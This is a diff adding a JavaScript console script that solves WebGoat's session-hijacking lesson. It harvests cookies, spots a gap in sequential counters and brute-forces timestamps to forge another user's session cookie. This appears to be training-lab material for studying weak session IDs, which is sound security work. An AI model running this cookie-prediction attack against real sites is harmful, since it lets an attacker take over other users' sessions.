@@ -1,0 +1,81 @@
+async function hijackSession() {
+  const url = '/WebGoat/HijackSession/login';
+  const cookies = [];
+
+  console.log('%c[*] Collecting cookies...', 'color: cyan');
+
+  for (let i = 0; i < 6; i++) {
+    document.cookie = "hijack_cookie=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/WebGoat;";
+
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'username=&password='
+    });
+
+    const raw = document.cookie
+      .split(';')
+      .map(c => c.trim())
+      .find(c => c.startsWith('hijack_cookie='))
+      ?.split('=')[1];
+
+    if (raw && raw.includes('-')) {
+      // FIX: Use BigInt for the 19-digit sequence, but keep normal Number for the timestamp
+      const parts = raw.split('-');
+      const c = BigInt(parts[0]); 
+      const t = Number(parts[1]); 
+      
+      cookies.push({ counter: c, ts: t });
+      console.log(`  Cookie ${i + 1}: ${raw}`);
+    }
+    await new Promise(r => setTimeout(r, 50)); 
+  }
+
+  // --- Find the gap ---
+  // FIX: Custom sorting rule required for BigInts
+  cookies.sort((a, b) => a.counter < b.counter ? -1 : (a.counter > b.counter ? 1 : 0));
+  
+  console.log('%c[*] Looking for gap...', 'color: cyan');
+
+  for (let i = 0; i < cookies.length - 1; i++) {
+    const { counter: c1, ts: t1 } = cookies[i];
+    const { counter: c2, ts: t2 } = cookies[i + 1];
+
+    // FIX: Compare using '1n' (which means a BigInt of 1)
+    if (c2 - c1 > 1n) {
+      const missing = c1 + 1n; 
+      const range = t2 - t1;
+      console.log(`%c[!] GAP FOUND — missing counter=${missing.toString()}, trying ${range} timestamps`, 'color: orange');
+
+      // --- Brute force timestamps ---
+      for (let ts = t1; ts <= t2; ts++) {
+        const candidate = `${missing.toString()}-${ts}`;
+        
+        document.cookie = `hijack_cookie=${candidate}; path=/WebGoat`;
+
+        const resp = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'username=&password='
+        });
+        
+        const text = await resp.text();
+
+        if (text.includes('"lessonCompleted" : true') || text.includes('"lessonCompleted":true')) {
+          console.log(`%c[+] SUCCESS!  hijack_cookie = ${candidate}`, 'color: lime; font-weight: bold');
+          console.log('%cRefresh the lesson page to see the green banner!', 'color: lime');
+          return;
+        }
+
+        if ((ts - t1) % 100 === 0 && ts !== t1) {
+          console.log(`  ... ${ts - t1} / ${range} tried`);
+        }
+      }
+      console.log('%c[-] Range exhausted. The victim session probably expired. Run again.', 'color: red');
+      return;
+    }
+  }
+  console.log('%c[-] No gap found. Run the script again.', 'color: red');
+}
+
+hijackSession();
